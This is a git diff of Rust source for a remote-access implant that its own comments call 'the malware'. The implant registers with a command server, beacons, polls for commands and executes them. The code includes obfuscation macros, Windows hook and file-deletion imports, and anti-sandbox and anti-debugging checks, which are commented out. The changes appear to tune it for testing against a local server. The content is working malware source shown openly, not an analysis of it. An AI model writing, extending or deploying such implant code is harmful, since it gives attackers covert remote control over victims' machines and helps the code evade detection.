@@ -6,6 +6,7 @@ use system::{get_windows_version, read_file, set_windows_hook, delete_file,check
 use tokio::time::{sleep, Duration, Sleep};
 use std::sync::atomic::{AtomicBool, Ordering};
 use rand::{rngs::StdRng, SeedableRng, Rng};
+use encode::EncodeConnection;
 
 macro_rules! unwrap_or_panic {
     ($expr: expr) => {
@@ -46,20 +47,22 @@ macro_rules! dead_branches {
 #[tokio::main]
 async fn main() {
 
-    //anti sandbox
-    // sleep(Duration::from_secs(600)).await;
+    // //anti sandbox
+    // // sleep(Duration::from_secs(600)).await;
 
-    // check_for_debugging();
-    // check_for_process();
+    // // check_for_debugging();
+    // // check_for_process();
 
     const URL: &'static str = "http://127.0.0.1:5000";
 
     //All the mutex code for sharing with different threads 
     let paused = Arc::new(AtomicBool::new(false));
-    let server = Arc::new(server::Connection::new(&URL));
+    let server = Arc::new(server::Connection::new(&URL, 42));
     let arch = get_windows_version();
 
     let mut counter_beconing = 0;
+
+    //sends the intial request to register themselves
     let id: String = unwrap_or_panic!(server.register(arch).await);
 
     let server_for_beconing = Arc::clone(&server);
@@ -88,8 +91,6 @@ async fn main() {
         }
     });
 
-    dead_branches!("AHHH", "HAHH");
-
     let paused_command = Arc::clone(&paused);
     
     //thread that request for commands
@@ -103,7 +104,7 @@ async fn main() {
             
             let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
             execute_command(&rec, paused_command.clone()).await;
-            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
+            sleep(Duration::from_secs(3)).await;
         }
     });
 
@@ -129,8 +130,6 @@ async fn main() {
         }
     });
 
-    dead_branches!("AHHH", "HAHH");
-
     // Main loop for beaconing
     loop {
         match server_for_beconing.becon(&id_beconing).await {
@@ -152,8 +151,8 @@ async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
     let cmds: Vec<_> = cmd.split(':').collect();
 
     dead_branches!("AHHH", "HAHH");
-
-    match cmds[0] {
+    let parsed_cmd = cmds[0].replace('\n', "").replace('\r', "");
+    match parsed_cmd.as_str() {
 
         //if it's a slp sleep the malware
         "slp" => {
